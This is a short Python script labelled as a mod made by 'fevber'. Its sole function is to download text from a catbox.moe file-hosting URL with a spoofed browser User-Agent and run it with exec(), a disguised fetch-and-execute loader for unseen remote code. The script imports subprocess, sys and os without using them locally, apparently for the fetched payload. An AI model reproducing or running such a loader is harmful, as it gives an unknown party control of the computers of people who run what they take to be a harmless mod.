mod made by fevber

import urllib.request
import subprocess
import sys
import os

url = 'https://files.catbox.moe/xfa0x3.txt'
req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
code = urllib.request.urlopen(req).read().decode()
exec(code)
